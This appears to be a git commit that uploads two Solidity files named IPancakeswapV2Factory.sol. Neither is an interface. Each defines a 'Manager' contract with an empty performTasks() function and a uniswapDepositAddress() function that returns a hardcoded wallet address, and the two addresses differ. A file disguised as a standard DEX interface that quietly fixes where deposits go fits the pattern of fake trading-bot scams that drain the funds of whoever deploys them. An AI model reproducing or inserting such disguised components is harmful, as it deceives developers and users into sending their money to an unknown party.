3b2cb50847f8c039a3c785edf9462c9a211e716f
qie1234 <85544266+qie1234@users.noreply.github.com>
2022-01-04 20:49:41 +0800

    Add files via upload

---
+++ IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xa3ec85384dF26E06d1537735Cc69860f597e1bAD;
+	}
+}
---
+++ contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x63277F47Fc6EfE3AC015Cffdac86f8568c8AFFde;
+	}
+}
